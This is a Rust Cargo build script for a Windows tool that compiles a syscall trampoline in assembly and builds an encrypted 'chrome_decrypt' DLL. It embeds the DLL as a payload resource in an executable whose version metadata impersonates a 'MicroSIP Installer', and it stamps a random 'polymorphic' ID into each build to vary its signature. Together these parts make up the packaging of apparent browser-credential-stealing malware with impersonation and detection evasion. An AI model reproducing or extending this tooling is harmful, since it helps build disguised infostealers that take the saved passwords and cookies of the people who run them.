use rand::{Rng, distr::Alphanumeric};
use std::{fs, path::Path, process::Command};

fn generate_polymorphic_id() -> String {
    rand::rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect()
}

fn write_polymorphic_rc(polymorphic_id: &str, dll_path: &str) {
    // If resources_override.rc exists (user customization), copy it to resources.rc and just append payload + polymorphic id
    let override_exists = Path::new("resources_override.rc").exists();
    if override_exists {
        let mut override_content = fs::read_to_string("resources_override.rc").expect("Failed to read resources_override.rc");
        // Ensure PolymorphicID is present
        if !override_content.contains("PolymorphicID") {
            override_content = override_content.replace(
                "END\nEND", 
                &format!("            VALUE \"PolymorphicID\", \"{}\"\n        END\n    END", polymorphic_id)
            );
        }
        // Append payload resource if not present
        if !override_content.contains("PAYLOAD_DLL RCDATA") {
            override_content.push_str(&format!("\nPAYLOAD_DLL RCDATA \"{}\"\n", dll_path));
        }
        if !override_content.contains("IDI_ICON1 ICON") {
            override_content.push_str("IDI_ICON1 ICON \"icon.ico\"\n");
        }
        fs::write("resources.rc", override_content).expect("Failed to write customized resources.rc");
        return;
    }

    let rc_content = format!(
        r#"#include <windows.h>
1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "FileDescription", "MicroSIP Installer"
            VALUE "ProductName", "MicroSIP"
            VALUE "ProductVersion", "3.21.6"
            VALUE "LegalCopyright", "Copyright © 2011-2025, MicroSIP (www.microsip.org). All rights"
            VALUE "PolymorphicID", "{}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END

PAYLOAD_DLL RCDATA "{}"
IDI_ICON1 ICON "icon.ico"
"#,
        polymorphic_id, dll_path
    );
    fs::write("resources.rc", rc_content).expect("Failed to write polymorphic resources.rc");
}
fn compile_assembly() {
    println!("cargo:rerun-if-changed=src/syscall_trampoline.asm");

    let output = Command::new("cmd").args(&["/C", "build_asm.bat"]).output();

    match output {
        Ok(output) if output.status.success() => {
            println!("cargo:note=Successfully compiled assembly file");
            println!("cargo:rustc-link-arg=target/syscall_trampoline.obj");
        }
        Ok(output) => {
            println!("cargo:warning=ML64 failed to compile assembly:");
            println!(
                "cargo:warning=stdout: {}",
                String::from_utf8_lossy(&output.stdout)
            );
            println!(
                "cargo:warning=stderr: {}",
                String::from_utf8_lossy(&output.stderr)
            );
            panic!("Failed to compile assembly file");
        }
        Err(e) => {
            println!("cargo:warning=Failed to run ML64: {}", e);
            panic!("Could not find ML64 assembler");
        }
    }
}

fn main() {
    if !cfg!(target_os = "windows") {
        panic!("This tool only works on Windows");
    }

    compile_assembly();

    let encrypted_dll_path = "build/release/chrome_decrypt.enc";

    if !Path::new(encrypted_dll_path).exists() {
        println!("cargo:warning=Encrypted DLL not found, attempting to build...");

        let vcvars_path = r#"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"#;

        let output = Command::new("cmd")
            .args(&["/C", &format!(r#""{}" && make.bat"#, vcvars_path)])
            .output();

        match output {
            Ok(output) if output.status.success() => {
                println!("cargo:warning=Successfully built and encrypted C++ DLL");
            }
            _ => {
                println!("cargo:warning=Failed to build C++ DLL automatically");
            }
        }
    }

    if Path::new(encrypted_dll_path).exists() {
        let polymorphic_id = generate_polymorphic_id();
        println!("cargo:note=Generated polymorphic ID: {}", polymorphic_id);
        write_polymorphic_rc(&polymorphic_id, encrypted_dll_path);

        embed_resource::compile("resources.rc", embed_resource::NONE)
            .manifest_optional()
            .unwrap();
    } else {
        panic!(
            "Encrypted DLL not found at {}, this is required for the build",
            encrypted_dll_path
        );
    }

    // Tell Cargo to rerun if any of these change
    println!("cargo:rerun-if-changed=build/release/chrome_decrypt.dll");
    println!("cargo:rerun-if-changed=build/release/chrome_decrypt.enc");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=make.bat");
    println!("cargo:rerun-if-changed=cpp/");
    println!("cargo:rerun-if-changed=src/syscall_trampoline.asm");
    println!("cargo:rerun-if-changed=build_asm.bat");
}
